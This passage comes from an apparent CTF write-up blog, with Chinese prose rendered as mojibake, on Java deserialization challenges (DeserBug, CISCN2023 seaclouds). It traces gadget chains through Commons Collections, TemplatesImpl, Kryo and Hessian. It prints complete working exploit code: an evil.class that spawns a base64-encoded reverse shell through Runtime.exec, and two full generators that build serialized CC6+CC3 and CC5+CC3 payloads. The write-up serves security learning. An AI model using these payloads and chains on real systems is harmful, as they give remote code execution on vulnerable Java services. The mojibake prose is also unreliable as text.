src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813001032892.png" alt="image-20240813001032892"></p><p>è¿™é‡Œç”¨åˆ°<code>TrAXFilter</code>çš„æ„é€ æ–¹æ³•ï¼Œå…¶å®ç®—æ˜¯åˆ°CC3ååŠæ®µï¼Œé‚£ä¹ˆåç»­é“¾å­å°±æœ‰äº†ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">com.app.Myexpect#getAnyexcept =&gt;<br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°±æ˜¯è¦æ‰¾å“ªé‡Œè°ƒç”¨äº†<code>getAnyexcept</code>ï¼Œç»“åˆæç¤º<code>cn.hutool.json.JSONObject.put</code>-&gt;<code>com.app.Myexpect#getAnyexcept</code>å…¶å®ä¹Ÿå¾ˆç®€å•ã€‚</p><p>å®Œæ•´é“¾å­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>HashSet#readObject() =&gt;<br>HashMap#put() =&gt;<br>HashMap#hash() =&gt;<br>TiedMapEntry#hashCode() =&gt;<br>TiedMapEntry#getValue() =&gt;<br>LazyMap#get() =&gt;<br><br>cn.hutool.json.JSONObject.put =&gt;<br>com.app.Myexpect#getAnyexcept =&gt;<br><br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><p>å®Œç¾ã€‚</p><p>å…¶å®åˆ°è¿™é‡Œä¹Ÿèƒ½å‘ç°ï¼ŒCC5ä¹Ÿå¯ä»¥èµ°ï¼Œå› ä¸ºå‰åŠéƒ¨åˆ†ä¸å—å½±å“ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream#readObject() =&gt;<br>    BadAttributeValueExpException#readObject() =&gt;<br>    TiedMapEntry#toString() =&gt;<br>    LazyMap#get() =&gt;<br>    <br>cn.hutool.json.JSONObject.put =&gt;<br>com.app.Myexpect#getAnyexcept =&gt;<br><br>TrAXFilter#TrAXFilter() =&gt;<br>TemplatesImpl#newTransformer() =&gt;<br>TemplatesImpl#getTransletInstance() =&gt;<br>TemplatesImpl#defineTransletClasses() =&gt;<br>TemplatesImpl$TransletClassLoader#defineclass()<br></code></pre></td></tr></table></figure><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>evil.classï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">evil</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractTranslet</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span><br>            <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator,</span><br><span class="hljs-params">                          SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;&#125;<br>    <span class="hljs-keyword">static</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;bash -c &#123;echo,&lt;base64åå¼¹shell&gt;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC6+CC3-EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_CC6_CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj&#125;);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        entries.put(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> entries;<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;k&quot;</span>);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        innerMap.clear();<br><br>        setFieldValue(transformer, <span class="hljs-string">&quot;iConstant&quot;</span>, myexpect);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        output.writeObject(expMap);<br>        output.flush();<br>        baos.flush();<br><br>        <span class="hljs-type">byte</span>[] data = baos.toByteArray();<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">bugstr</span> <span class="hljs-operator">=</span> URLEncoder.encode(Base64.getEncoder().encodeToString(data));<br>        System.out.println(bugstr);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>CC5+CC3-EXPï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.deserbug;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_CC5_CC3</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object newValue)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> obj.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, newValue);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = ClassPool.getDefault().get(evil.class.getName()).toBytecode();<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br><br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;EddieMurphy&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; obj &#125;);<br><br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">entries</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br><br>        <span class="hljs-type">LazyMap</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> (LazyMap) LazyMap.decorate(entries, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bad</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setFieldValue(bad,<span class="hljs-string">&quot;val&quot;</span>,tiedMapEntry);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(bad);<br>        oos.close();<br><br>        <span class="hljs-type">byte</span>[] byteArray = baos.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encodedString</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br>        System.out.println(encodedString);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>GETä¼ å‚ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240813010828414.png" alt="image-20240813010828414"></p><h2 id="CISCN2023-è¥¿å—-seaclouds"><a href="#CISCN2023-è¥¿å—-seaclouds" class="headerlink" title="[CISCN2023 è¥¿å—]seaclouds"></a>[CISCN2023 è¥¿å—]seaclouds</h2><p>è¿™é“é¢˜éå¸¸å…·æœ‰ä»£è¡¨æ€§ï¼Œæ‰“çš„æ˜¯Kryoååºåˆ—åŒ–å’ŒHessianåŸç”ŸJDKçš„POCã€‚</p><p>åˆšæŠŠKryoå’ŒHessianå­¦äº†å°±å†æ¥é‡æ¸©ä¸€ä¸‹è¿™é“é¢˜ç›®ã€‚</p><p>å®¡è®¡ä¸€ä¸‹æºç ï¼š</p><p>MessageController.java:</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151127498.png" alt="image-20240816151127498"></p><p>è®¿é—®æ ¹è·¯ç”±ä¼ å‚messageï¼Œ</p><p>é‚£ä¹ˆå®ƒä¼šè§£ç ä¸€ä¸ªç¡¬ç¼–ç çš„Base64å­—ç¬¦ä¸²ã€‚å¦‚æœ<code>message</code>å‚æ•°ä¸ä¸ºnullï¼Œé‚£ä¹ˆå®ƒä¼šå°è¯•è§£ç è¯¥å‚æ•°ã€‚å¦‚æœè§£ç å¤±è´¥ï¼Œå®ƒä¼šè§£ç å¦ä¸€ä¸ªç¡¬ç¼–ç çš„Base64å­—ç¬¦ä¸²ã€‚</p><p>è§£ç åçš„å­—èŠ‚æ•°ç»„è¢«ä¼ é€’ç»™<code>CodecMessageConverter</code>çš„<code>toMessage</code>æ–¹æ³•ï¼Œè¯¥æ–¹æ³•å°†å­—èŠ‚æ•°ç»„è½¬æ¢ä¸º<code>Message</code>å¯¹è±¡ã€‚ç„¶åï¼Œè¯¥æ–¹æ³•è¿”å›<code>Message</code>å¯¹è±¡çš„æœ‰æ•ˆè´Ÿè½½ã€‚</p><p>User.javaï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151153559.png" alt="image-20240816151153559"></p><p>å®šä¹‰äº†ä¸€äº›setterå’Œgetteræ–¹æ³•ï¼Œ</p><p>ä¾èµ–æœ‰Kryoï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151355223.png" alt="image-20240816151355223"></p><p>é‚£å…¥æ‰‹ç‚¹å°±æ˜¯ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CodecMessageConverter</span> <span class="hljs-variable">codecMessageConverter</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CodecMessageConverter</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageCodec</span>());<br>Message&lt;?&gt; messagecode = codecMessageConverter.toMessage(decodemsg, (MessageHeaders)<span class="hljs-literal">null</span>);<br><span class="hljs-keyword">return</span> messagecode.getPayload();<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›toMessageæ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816151643378.png" alt="image-20240816151643378"></p><p>å…³é”®åœ¨decodeï¼Œè·Ÿè¿›<code>AbstractKryoCodec#decode</code>æ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816155453265.png" alt="image-20240816155453265"></p><p>å†è·Ÿè¿›åˆ°<code>PojoCodec#deDecode</code>æ–¹æ³•ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816155525741.png" alt="image-20240816155525741"></p><p>æ‰¾åˆ°ä½ äº†ï¼Œ<code>Kryo.readObject()</code>ã€‚</p><p>å›åˆ°å‰é¢çš„<code>CodecMessageConverter</code>ï¼Œè¿™é‡ŒæŒ‡å®šäº†è§£ç çš„ç±»å‹<code>this.messageClass</code>ï¼ˆ<code>GenericMessage</code>ï¼‰ï¼Œ</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152122326.png" alt="image-20240816152122326"></p><p>æœ€å<code>MessageCodec#decode</code>ä¹Ÿè¿”å›äº†ä¸€ä¸ª<code>Message</code>å¯¹è±¡ï¼Œæ‰€ä»¥åé¢æ„é€ çš„æ—¶å€™è¦ç”¨<code>GenericMessage</code>å°†payloadå°è£…èµ·æ¥ï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">GenericMessage</span> <span class="hljs-variable">genericMessage</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GenericMessage</span>(hashMap);<br><span class="hljs-type">byte</span>[] decodemsg = (<span class="hljs-type">byte</span>[]) codecMessageConverter.fromMessage(genericMessage, <span class="hljs-literal">null</span>);<br>System.out.println(URLEncoder.encode(Base64.getEncoder().encodeToString(decodemsg), <span class="hljs-string">&quot;UTF-8&quot;</span>));<br></code></pre></td></tr></table></figure><p>è·Ÿè¿›<code>GenericMessage</code>ï¼š</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152901266.png" alt="image-20240816152901266"></p><p>çœ‹åˆ°äº†å‰é¢æœ€åè¿”å›çš„getPayload()ï¼Œä¹Ÿå¯ä»¥è¯´æ˜æˆ‘ä»¬ååºåˆ—åŒ–å¾—åˆ°çš„ç»“æœæ˜¯ä¸ªGenericMessageå¯¹è±¡ã€‚</p><p><img src="/2024/08/16/java%E5%AE%9E%E6%88%98-%E9%87%8D%E8%B5%B0%E5%85%AB%E5%8D%81%E4%B8%80%E9%9A%BE/image-20240816152513832.png" alt="image-20240816152513832"></p><p>å‡ ä¸ªè€ç†Ÿäººäº†ï¼ŒåŸºæœ¬ä¸Šçœ‹åˆ°è¿™äº›å°±èƒ½æƒ³åˆ°å¯¹åº”é“¾å­ã€‚</p><p>åœ¨<a href="https://so.csdn.net/so/search?q=Spring%E4%BE%9D%E8%B5%96&spm=1001.2101.3001.7020">Springä¾èµ–</a>ä¸‹ï¼Œå¯ä»¥è§¦å‘<code>jackson</code>çš„<code>BaseJsonNode#toString</code>ï¼Œä»è€Œè°ƒç”¨getterï¼Œè€Œåä¸ºæ‰€æ¬²ä¸ºï¼Œè‡³äºå¦‚ä½•è°ƒç”¨<code>toString</code>ï¼Œå¯¹äºåŸç”Ÿååºåˆ—åŒ–ï¼Œèµ°<code>BadAttributeValueExpException</code>æœ€ä¸ºæ–¹ä¾¿ï¼Œå¯¹äºFieldå‹çš„éåŸç”Ÿååºåˆ—åŒ–ï¼Œå¦‚æœå¯¹äºMapçš„ååºåˆ—åŒ–è¿‡ç¨‹æœ‰ç±»ä¼¼<code>HashMap#put</code>çš„å®ç°ï¼Œå°±å¯ä»¥è€ƒè™‘<code>HotSwappableTargetSource</code>åˆ©ç”¨é“¾ï¼Œè¿™ä¹Ÿæ˜¯KryoéåŸç”Ÿååºåˆ—åŒ–é“¾å­çš„é‡è¦éƒ¨åˆ†ã€‚</p><p>ä½†æ˜¯ç›´æ¥ç”¨Kryoé“¾å­å¥—è‚¯å®šä¸è¡Œï¼Œå› ä¸ºç½‘ä¸ŠKryoç›¸å…³çš„æ”»å‡»éƒ½æ˜¯åœ¨Dubboä¸‹åˆ©ç”¨çš„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">com.esotericsoftware.kryo#readClassAndObject -&gt;<br>    com.esotericsoftware.kryo.serializers#read -&gt;<br>        java.util.HashMap#put -&gt;<br>            org.springframework.aop.target.HotSwappableTargetSource#equals -&gt;<br>                com.sun.org.apache.xpath.internal.objects.XString -&gt;<br>                    com.alibaba.fastjson.JSON#toString -&gt; fastjson gadget <br>                            -&gt; TemplatesImpl to load evil 